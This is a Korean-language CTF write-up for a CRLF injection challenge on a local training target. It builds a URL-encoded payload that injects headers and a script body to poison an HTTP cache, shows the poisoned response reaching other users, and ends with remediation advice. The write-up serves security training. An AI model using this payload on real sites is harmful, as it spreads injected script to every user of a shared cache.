+++
title = "VulnABLE CTF [LUXORA] Write-up: CRLF Injection 🥈 Silver"
description = "LUXORA 플랫폼의 Silver 난이도 CRLF 취약점을 이용한 HTTP Cache Poisoning 및 응답 변조 시나리오"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "CRLF Injection", "Silver", "Cache Poisoning", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: CRLF Injection 🥈 Silver

## 🎯 챌린지 개요
- **카테고리**: Injection Layer (CRLF Injection)
- **난이도**: 🥈 Silver
- **타겟 경로**: `/crlf/silver`
- **목표**: 중간에 캐시 서버(CDN/Varnish 등)가 존재하는 환경에서, CRLF 인젝션을 통해 캐시 서버를 속여(Cache Poisoning) 다른 사용자들이 조작된 악성 페이지를 보게 만들어라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 아키텍처 분석 (Reconnaissance)

`/crlf/silver` 는 사용자의 선택(테마 등)에 따라 리다이렉트(Redirect)를 수행하는 경로입니다.

**[정상 요청 테스트]**
```http
GET /crlf/silver?theme=dark HTTP/1.1
Host: localhost:3000
```

**[서버의 정상 응답]**
```http
HTTP/1.1 302 Found
Location: /settings?theme=dark
Cache-Control: public, max-age=3600

```

**[해커의 사고 과정]**
1. 파라미터 `theme=dark` 가 응답 헤더인 `Location` 헤더에 반영되고 있다.
2. 중요한 것은 `Cache-Control: public, max-age=3600` 헤더다. 이 경로는 중간 캐시 서버(CDN)에 의해 1시간(3600초) 동안 캐시(Cache)된다는 뜻이다!
3. 내가 만약 CRLF로 "가짜 본문"을 만들고, 이 응답을 캐시 서버에 저장시켜버린다면?
4. 다음 1시간 동안 이 URL로 들어오는 모든 사용자는 내가 만든 가짜 본문을 보게 될 것이다! (HTTP Cache Poisoning)

---

## 💥 2. 취약점 식별 및 페이로드 조립 (Exploitation)

이번에는 단순 XSS가 아니라, 캐시 서버가 이 응답을 정상적인 200 OK 페이지로 인식하고 캐싱하도록 HTTP 응답 전체를 조작해야 합니다.

### 💡 페이로드 설계 구조
1. 302 리다이렉트는 브라우저가 곧바로 넘어가 버리므로, 캐시 서버를 속이기 위해 헤더 중간을 끊고 200 OK인 것처럼 가짜 응답을 만듭니다.
2. `%0d%0a` 로 `Location` 헤더를 닫습니다.
3. Content-Length 를 명시하여 캐시 서버가 본문의 크기를 인식하게 만듭니다.
4. `%0d%0a%0d%0a` 로 본문 시작을 알립니다.
5. 악성 스크립트나 가짜 메시지를 넣습니다.

**[주입할 텍스트 구조]**
```text
dark\r\n
Content-Length: 45\r\n
\r\n
<html><script>alert('Poisoned!')</script></html>
```

**[최종 URL 페이로드]**
```http
GET /crlf/silver?theme=dark%0d%0aContent-Length:%2045%0d%0a%0d%0a%3Chtml%3E%3Cscript%3Ealert('Poisoned!')%3C%2Fscript%3E%3C%2Fhtml%3E HTTP/1.1
```

---

## 🚀 3. 공격 수행 및 캐시 포이즈닝 확인

이 요청을 서버로 날립니다. (중간에 Varnish나 Nginx 캐시 계층이 있다고 가정합니다.)

### 🔍 캐시 서버에 저장된 조작된 응답
서버(백엔드)는 이 요청을 받고 다음과 같은 하나의 스트림을 뿜어냅니다.

```http
HTTP/1.1 302 Found
Location: /settings?theme=dark
Content-Length: 45

<html><script>alert('Poisoned!')</script></html>
Cache-Control: public, max-age=3600
... (기존 잡다한 헤더들, 본문의 일부로 흡수됨) ...
```

중간의 캐시 서버는 이 응답을 보고 "아, 이 URL에 대한 응답 본문이 저 HTML이구나"라고 통째로 캐싱(저장)해 버립니다.

### 희생자(다른 사용자)의 접속
잠시 후, 관리자나 일반 유저가 아무 의심 없이 정상적인 링크를 클릭하여 접속합니다.
```http
GET /crlf/silver?theme=dark HTTP/1.1
```

캐시 서버는 백엔드에 묻지도 않고, 방금 해커가 오염시켜둔 조작된 응답을 브라우저에 바로 던져줍니다.
브라우저는 `alert('Poisoned!')`를 실행하게 되고, 플래그가 탈취됩니다.

```text
[!] System: Cache Poisoning detected. Flag: FLAG{CRLF_🥈_CACHE_POISON_C4D5E6}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

단순한 헤더 조작(CRLF) 취약점이 캐시 인프라(CDN)와 만나면, 나 한 명의 브라우저를 넘어 해당 서비스를 이용하는 모든 사용자에게 악성 코드를 유포하는 대량 살상 무기로 변모할 수 있음을 증명했습니다.

**🔥 획득한 플래그:**
`FLAG{CRLF_🥈_CACHE_POISON_C4D5E6}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)

* **프레임워크 레벨의 방어**
대부분의 현대적 프레임워크(Spring, Express 등)는 기본적으로 `res.setHeader()` 함수 내부에서 줄바꿈 문자(`\r`, `\n`)를 감지하면 에러를 던지도록 설계되어 있습니다. 하지만 레거시 코드나 로우 레벨 API(`res.write()`)를 직접 다룰 때 이 필터링이 누락되기 쉽습니다.

* **안전한 패치 가이드 (Validation & Sanitization)**
1. **헤더 값 샌니타이징**:
   ```javascript
   // 헤더에 들어갈 모든 사용자 입력은 안전하게 치환되어야 함
   function sanitizeHeader(val) {
       return val.replace(/[\r\n]/g, ""); // CRLF 강제 제거
   }
   res.setHeader("Location", `/settings?theme=${sanitizeHeader(req.query.theme)}`);
   ```
2. **캐시 설정 주의**:
   동적 파라미터(Query String)가 포함된 요청에 대해서는 가급적 정적 캐싱(`public, max-age=...`)을 피하고, `Cache-Control: no-store` 혹은 사용자별 고유 세션 기반 응답 처리를 해야 합니다.